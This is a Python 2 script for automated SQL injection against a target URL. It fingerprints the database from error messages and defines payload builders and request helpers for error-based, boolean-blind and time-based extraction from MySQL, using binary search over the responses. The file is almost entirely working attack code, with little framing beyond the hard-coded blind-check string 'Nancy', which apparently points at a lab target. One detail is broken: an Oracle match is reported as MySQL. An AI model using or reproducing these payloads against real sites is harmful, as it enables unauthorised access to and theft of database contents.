# -*- coding: utf-8 -*-
import httplib
import urllib
from urlparse import urlparse
import sys
import time
import argparse
import error_sql as error

global caller

parser = argparse.ArgumentParser()
parser.add_argument('-u', dest="url", required=True, action="store", help='SQL Injection Targeting URL')
parser.add_argument('-t', dest="table", required=False, default="", action="store", help='Table Name')
parser.add_argument('-c', dest="column", required=False, default="", action="store", help='Column Name')
args = parser.parse_args()

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.02883.87 Safari/537.36",
    "Content-type": "application/x-www-form-urlencoded",
    "Accept": "text/html",
    "Connection": "keep-alive"
}

tmp_url = urlparse(args.url)
scheme = tmp_url.scheme
domain = tmp_url.netloc
path = tmp_url.path
tmp_params = tmp_url.query
tmp_params = tmp_params.split("=")[0]
conn = httplib.HTTPConnection(domain, "80")

tmp_count = 0
delims = "!~!~!"


def httpreq(request_param):
    params = plus_white(tmp_params + "=" + request_param)
    #print params
    conn.request("GET", path + "?" + params, None, headers)
    response = conn.getresponse().read()
    time.sleep(0.1)

    return response


def check_dbms():
    ck_dbms = httpreq("'")

    if ck_dbms.find('MySQL') != -1:
        cn_dbms = 'MYSQL'
        print "[Info] It's database looks like '" + cn_dbms + "'"
        return cn_dbms

    elif ck_dbms.find('mssql') != -1:
        cn_dbms = 'MSSQL'
        print "[Info] It's database looks like '" + cn_dbms + "'"
        return cn_dbms

    elif ck_dbms.find('ORA') != -1:
        cn_dbms = 'MySQL'
        print "[Info] It's database looks like '" + cn_dbms + "'"
        return cn_dbms

    else:
        print "[Info] Couldn't Assume database"
        return -1


def error_httpreq(vuln_part):
    vuln_param = "=(select a from (select count(*),concat('" + delims + "'," + vuln_part + ",'" + delims + "',floor(rand(0)*2))a from information_schema.tables group by a)b)%23"
    params = tmp_params + plus_white(vuln_param)
    conn.request("GET", path + "?" + params, None, headers)
    response = conn.getresponse().read()  # 응답 값
    return response.split(delims)[1]


def caller_blind_httpreq(mid, query):
    tmp = httpreq(query + ">" + str(mid))
    if tmp.find('Nancy') > 0:
        return 1
    else:
        return 0


def caller_time_httpreq(mid, query):
    vuln_param = "' and case when " + query + ">" + str(mid) + " then 1 else(select count(*) from information_schema.columns col1,information_schema.tables tab1,information_schema.tables tab2)end%23"
    b_time = time.time()
    tmp = httpreq(vuln_param)
    a_time = time.time()
    #print"time(after)-time(before): " + str(a_time - b_time)
    if (a_time - b_time) < 0.3:
        return 1
    else:
        return 0


def binary_httpreq(min, max, query):
    mid = (min + max) / 2

    # tmp_cnt = httpreq(query + ">" + str(mid))
    # elif(sys._getframe(2).f_code.co_name == "time_based_sql"):

    # print query + ">" + str(mid)

    if caller == "blind":
        cnt = caller_blind_httpreq(mid, query)
    else:
        cnt = caller_time_httpreq(mid, query)

    if (max - min) <= 1:
        if cnt:
            return max
        else:
            return min

    if cnt:
        return binary_httpreq(mid, max, query)
    else:
        return binary_httpreq(min, mid, query)


def plus_white(query):
    return query.replace(' ', '+')
